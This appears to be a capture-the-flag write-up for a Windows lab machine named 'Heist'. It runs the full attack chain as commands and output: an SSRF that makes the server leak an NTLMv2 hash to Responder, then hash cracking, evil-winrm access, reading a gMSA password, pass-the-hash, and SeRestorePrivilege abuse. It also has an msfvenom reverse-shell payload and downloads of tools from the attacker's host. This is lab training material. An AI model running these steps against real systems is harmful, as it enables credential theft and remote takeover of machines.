# Heist

### Enumeration

```
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: Super Secure Web Browser
```

http://192.168.147.165:8080/?url=http://localhost:8080 - **SSRF**

```
# cd /usr/share/responder
# python3 Responder.py -I tun0 --lm -v
```

**http://192.168.147.165:8080/?url=http%3A%2F%2F192.168.49.147%2F**

```
[HTTP] Sending NTLM authentication request to 192.168.147.165
[HTTP] GET request from: 192.168.147.165  URL: / 
[HTTP] Host             : 192.168.49.147 
[HTTP] NTLMv2 Client   : 192.168.147.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:[REDACTED]
```

NTLMv2 Hash -> hash.txt

```
$ john hash.txt
[REDACTED]    (enox)
```

### Initial Access

```
$ evil-winrm -u enox -p [REDACTED] -i 192.168.147.165
```

### Lateral Movement

```
*Evil-WinRM* PS C:\Users\enox\Desktop> type todo.txt
- Setup Flask Application for Secure Browser [DONE]
- Use group managed service account for apache [DONE]
- Migrate to apache
```

svc\_apache$ -> managed service account

```
*Evil-WinRM* PS C:\USers> net user enox
Global Group memberships     *Web Admins           *Domain Users
```

> Enox account in the Web Admins group. May be, we have some power over the Apache account.
>
> Group Managed Service Accounts (GMSA)
>
> Group Managed Service Accounts provide a higher security option for non-interactive applications, services, processes, or tasks that run automatically but need a security credential.
>
> These service accounts are given automatically-generated passwords. Given certain permissions, it is possible to retrieve these password hashes from Active Directory. To see what users or groups have permissions to do that for a given service account, we can look up the PrincipalsAllowedToRetrieveManagedPassword user property on the account.

[https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe](https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe)

```
*Evil-WinRM* PS C:\Users\enox\Desktop> upload GMSAPasswordReader.exe

*Evil-WinRM* PS C:\USers\enox\Documents> ./GMSAPasswordReader.exe --accountname svc_apache
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : [REDACTED]
[*]       aes128_cts_hmac_sha1 : [REDACTED]
[*]       aes256_cts_hmac_sha1 : [REDACTED]
[*]       des_cbc_md5          : [REDACTED]

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : [REDACTED]
[*]       aes128_cts_hmac_sha1 : [REDACTED]
[*]       aes256_cts_hmac_sha1 : [REDACTED]
[*]       des_cbc_md5          : [REDACTED]
```

Current Value -> rc4\_hmac

```
$ evil-winrm -u 'svc_apache$' -H [REDACTED]-i 192.168.147.165
```

### PrivEsc

SeRestorePrivilege - Enabled

[https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe)

```
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> Invoke-WebRequest -Uri http://192.168.49.147/SeRestoreAbuse.exe -OutFile SeRestoreAbuse.exe
```

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.147 LPORT=80 -f exe -o shell.exe
```

```
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> Invoke-WebRequest -Uri http://192.168.49.147/shell.exe -OutFile shell.exe

*Evil-WinRM* PS C:\Users\svc_apache$\Documents> .\SeRestoreAbuse.exe "cmd /c \Users\svc_apache$\Documents\shell.exe"
```
